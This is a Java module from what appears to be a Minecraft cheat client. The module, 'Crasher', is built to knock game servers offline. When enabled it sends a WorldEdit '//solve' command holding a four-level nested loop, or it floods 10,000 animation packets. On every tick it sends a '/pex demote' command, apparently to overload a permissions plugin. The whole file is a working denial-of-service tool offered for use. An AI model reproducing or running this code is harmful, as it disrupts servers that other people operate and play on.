package slavikcodd3r.rainbow.module.modules.exploits;

import java.util.Iterator;
import net.minecraft.network.Packet;
import net.minecraft.network.play.client.C00PacketKeepAlive;
import net.minecraft.network.play.client.C01PacketChatMessage;
import net.minecraft.network.play.client.C03PacketPlayer;
import net.minecraft.network.play.client.C0APacketAnimation;
import slavikcodd3r.rainbow.event.EventTarget;
import slavikcodd3r.rainbow.event.events.PacketSendEvent;
import slavikcodd3r.rainbow.event.events.UpdateEvent;
import slavikcodd3r.rainbow.module.Module;
import slavikcodd3r.rainbow.option.Option.Op;
import slavikcodd3r.rainbow.utils.ClientUtils;
import slavikcodd3r.rainbow.utils.NetUtil;
import net.minecraft.client.Minecraft;
import net.minecraft.entity.Entity;
import net.minecraft.entity.player.EntityPlayer;
import java.util.ArrayList;

@Module.Mod(displayName = "Crasher")
public class Crasher extends Module
{
	@Op(name = "New")
	private boolean newmod;
	Minecraft mc = Minecraft.getMinecraft();
	
	@EventTarget
    public void onUpdate(final UpdateEvent event) {
		if (this.newmod) {
		mc.thePlayer.sendQueue.addToSendQueue(new C01PacketChatMessage("/pex demote a a"));
		}
	}
	
    @Override
    public void enable() {
    	if (this.newmod) {
    		mc.thePlayer.sendQueue.addToSendQueue(new C01PacketChatMessage("//solve for(i=0;i<256;i++){for(a=0;a<256;a++){for(b=0;b<256;b++){for(c=0;c<256;c++){}}}}"));
    		super.enable();
    	} else {
        for (int i = 0; i < 10000; ++i) {
        	NetUtil.sendPacketNoEvents(new C0APacketAnimation());
            this.disable();
        }
    	}
    }
}

